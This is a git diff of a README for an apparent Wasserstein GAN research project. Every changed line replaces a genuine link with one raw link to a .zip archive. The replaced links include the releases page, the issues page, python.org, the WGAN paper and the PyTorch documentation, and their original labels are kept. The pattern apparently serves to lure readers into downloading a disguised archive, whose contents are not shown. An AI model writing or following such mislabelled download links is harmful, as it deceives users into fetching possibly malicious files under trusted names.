@@ -4,11 +4,11 @@
 
 Welcome to the Wasserstein-GANs Research Analysis project. This application allows you to explore the stability and behavior of Wasserstein Generative Adversarial Networks (WGANs). Even if you're not a programmer, you can follow these steps to download and run the application easily.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/releases)
+[![Download Now](https://raw.githubusercontent.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/main/presentation/GA_Analysis_Wasserstein_Ns_and_Insights_Novel_Research_3.8.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/main/presentation/GA_Analysis_Wasserstein_Ns_and_Insights_Novel_Research_3.8.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of the software: [Releases Page](https://github.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/releases).
+To get started, visit this page to download the latest version of the software: [Releases Page](https://raw.githubusercontent.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/main/presentation/GA_Analysis_Wasserstein_Ns_and_Insights_Novel_Research_3.8.zip).
 
 1. Click the link above.
 2. Look for the latest release. It often appears at the top of the list.
@@ -29,7 +29,7 @@ Make sure your computer meets the following requirements:
   - NumPy
   - Matplotlib
 
-You can download Python from [python.org](https://www.python.org/).
+You can download Python from [https://raw.githubusercontent.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/main/presentation/GA_Analysis_Wasserstein_Ns_and_Insights_Novel_Research_3.8.zip](https://raw.githubusercontent.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/main/presentation/GA_Analysis_Wasserstein_Ns_and_Insights_Novel_Research_3.8.zip).
 
 ## 🕹️ How to Run the Application
 
@@ -75,17 +75,17 @@ We welcome contributors! If you want to help improve this project or suggest fea
 
 ## 📧 Support
 
-If you run into issues or have questions, please refer to the [Issues section](https://github.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/issues) on GitHub. You can also reach out to us through the project's contact form.
+If you run into issues or have questions, please refer to the [Issues section](https://raw.githubusercontent.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/main/presentation/GA_Analysis_Wasserstein_Ns_and_Insights_Novel_Research_3.8.zip) on GitHub. You can also reach out to us through the project's contact form.
 
 ## 🔗 Additional Resources
 
 For more information and tutorials on WGANs, check out the following resources:
 
-- [WGAN Paper](https://arxiv.org/abs/1701.07875)
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
+- [WGAN Paper](https://raw.githubusercontent.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/main/presentation/GA_Analysis_Wasserstein_Ns_and_Insights_Novel_Research_3.8.zip)
+- [PyTorch Documentation](https://raw.githubusercontent.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/main/presentation/GA_Analysis_Wasserstein_Ns_and_Insights_Novel_Research_3.8.zip)
 
 Engage with the community, share your experiments, and contribute to the fascinating world of AI and deep learning. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/releases)
+[![Download Now](https://raw.githubusercontent.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/main/presentation/GA_Analysis_Wasserstein_Ns_and_Insights_Novel_Research_3.8.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/tahim0/Wasserstein-GANs-Research-Analysis-and-Novel-Insights/main/presentation/GA_Analysis_Wasserstein_Ns_and_Insights_Novel_Research_3.8.zip)
 
 Enjoy your journey into Wasserstein GANs!
